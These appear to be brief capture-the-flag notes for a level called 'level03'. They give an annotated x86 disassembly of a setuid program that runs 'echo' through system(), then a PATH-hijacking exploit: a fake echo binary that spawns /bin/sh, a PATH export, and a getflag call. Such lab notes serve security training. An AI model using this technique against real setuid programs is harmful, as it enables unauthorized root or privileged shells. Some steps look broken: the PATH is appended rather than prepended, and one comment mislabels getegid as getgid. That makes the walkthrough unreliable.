disass main: 

 0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	and    $0xfffffff0,%esp
   0x080484aa <+6>:	sub    $0x20,%esp ; stack frame de 32 octets
   0x080484ad <+9>:	call   0x80483a0 <getegid@plt>
   0x080484b2 <+14>:	mov    %eax,0x18(%esp); esp + 24 = getegid();
   0x080484b6 <+18>:	call   0x8048390 <geteuid@plt>
   0x080484bb <+23>:	mov    %eax,0x1c(%esp) ; esp + 28 = geteuid(); 
   0x080484bf <+27>:	mov    0x18(%esp),%eax ; eax = getegid();
   0x080484c3 <+31>:	mov    %eax,0x8(%esp) ; esp + 8 = getegid();
   0x080484c7 <+35>:	mov    0x18(%esp),%eax ;eax = getegid();
   0x080484cb <+39>:	mov    %eax,0x4(%esp) ; esp + 4 = getegid();
   0x080484cf <+43>:	mov    0x18(%esp),%eax ; eax = getgid();
   0x080484d3 <+47>:	mov    %eax,(%esp) ; esp + 0 = getegid();
   0x080484d6 <+50>:	call   0x80483e0 <setresgid@plt> ; call setresgid with getegid() for all params
   0x080484db <+55>:	mov    0x1c(%esp),%eax
   0x080484df <+59>:	mov    %eax,0x8(%esp)
   0x080484e3 <+63>:	mov    0x1c(%esp),%eax
   0x080484e7 <+67>:	mov    %eax,0x4(%esp)
   0x080484eb <+71>:	mov    0x1c(%esp),%eax
   0x080484ef <+75>:	mov    %eax,(%esp)
   0x080484f2 <+78>:	call   0x8048380 <setresuid@plt> ; idem call setresuid with geteuid() for all params
   0x080484f7 <+83>:	movl   $0x80485e0,(%esp) "usr/bin/env echo Exploit me"
   0x080484fe <+90>:	call   0x80483b0 <system@plt> ; print "exploit me\n"
   0x08048503 <+95>:	leave
   0x08048504 <+96>:	ret


make new echo binary in /tmp/dir

int main(void)
{
	system("/bin/sh");
	return 0;
}

export PATH=$PATH:/tmp/dir

./level03

getflag

